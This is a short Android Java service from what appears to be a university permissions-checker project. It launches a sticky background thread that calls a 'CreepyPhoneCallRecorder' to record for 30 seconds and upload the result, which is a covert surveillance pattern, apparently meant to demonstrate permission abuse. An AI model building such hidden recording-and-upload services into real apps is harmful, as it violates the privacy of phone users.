package edu.uiuc.permissionschecker.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import edu.uiuc.permissionschecker.CreepyPhoneCallRecorder;

public class PhoneMonitorService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
        Log.i("PhoneMonitorService", "ON BIND");
		return null;
	}
	
	public class PhoneThread extends Thread {
		public void run() {
	        Log.i("PhoneMonitorService", "Starting recording");
			CreepyPhoneCallRecorder i = new CreepyPhoneCallRecorder(getApplicationContext());
			i.scanForSecondsAndUpload(30, false, true);
	        Log.i("PhoneMonitorService", "Finishing recording and uploading");
			stopSelf();
		}
	}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i("PhoneMonitorService", "Received start id " + startId + ": " + intent);
        // We want this service to continue running until it is explicitly
        new PhoneThread().start();
        // stopped, so return sticky.
        return START_STICKY;
    }

}
